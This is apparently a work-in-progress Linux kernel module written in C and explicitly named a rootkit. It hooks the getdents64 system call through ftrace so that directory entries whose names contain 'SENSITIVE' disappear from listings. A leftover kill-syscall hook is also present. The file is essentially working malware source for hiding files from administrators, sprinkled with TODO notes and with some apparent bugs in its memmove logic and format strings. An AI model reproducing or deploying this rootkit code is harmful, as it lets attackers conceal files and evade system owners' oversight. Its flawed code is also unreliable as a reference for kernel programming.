// TODO go over code, refine it, remove includes, etc...

#include <linux/linkage.h>
#include <linux/init.h>

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

#include "helpers.h" // todo add include protection in header



///////////////////////////////////////////// OLD SECTION TO HOOK KILL REMOVE IT

// TODO dont forget PTREGS macro
static asmlinkage long (*orig_kill)(const struct pt_regs*);

asmlinkage int hook_kill(const struct pt_regs* regs)
{

    /// do some logic before calling original function
    pid_t pid = regs->di;
    int sig = regs->si;
    pr_info("IN PTREGS pid is %d, sig is %d\n", pid, sig);

    return orig_kill(regs);

}

//////////////////////////////////////// OLD SECTION TO HOOK KIL REMOVE IT


static asmlinkage long (*orig_getdents)(const struct pt_regs*);

asmlinkage int hook_getdents(const struct pt_regs* regs) {
	pr_info("start hook\n");
	long ret;
	unsigned long offset = 0;
	unsigned long bytes_left;
	struct linux_dirent64 *d, *kdirent;
	char *dirp = (char *)regs->si;
	pr_info("calling orig\n");
	ret = orig_getdents(regs);
	if (ret <= 0) {
		pr_info("returning orig ret <= 0\n");
		return ret;
	}
	
	kdirent = kmalloc(ret, GFP_KERNEL);
	if (!kdirent) { // TODO why returning ret here ? what does this mean that kmalloc accepts ret etc? GFP_KERNEL?
		return ret;
	}
	pr_info("post kmalloc\n");
	if (copy_from_user(kdirent, dirp, ret)) {
		kfree(kdirent);
		return ret;
	}
	
	pr_info("post copy from user\n");
	bytes_left = ret; // TODO what does this mean bytes left is RET?? wait what is RET? in this case? 
	pr_info("in hook getdents");
	while (bytes_left > 0) {
		d = (struct linux_dirent64 *)((char *)kdirent + offset);
		if (strstr(d->d_name, "SENSITIVE")) {
			pr_info("name matches");
			memmove(d, (char *)d + d->d_reclen, bytes_left - d->d_reclen);
			ret -= d->d_reclen;
			bytes_left -= d->d_reclen;
			continue; // TODO check the memmove in this case
		}
		else pr_info("not the desired one %so\n", (void*)d->d_name);

		offset += d->d_reclen;
		bytes_left -= d->d_reclen;
	}
	pr_info("before copy\n");

	if (copy_to_user(dirp, kdirent, ret)) {
		pr_info("calling free");
		kfree(kdirent);
		return ret;
	}
	pr_info("before kfree\n");

	kfree(kdirent);
	return ret;
}

// define which functions to hook
static struct ftrace_hook hooks[] = {
 //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    return 0;
}


// Module cleanup: Restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("reached rootkit_exit.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
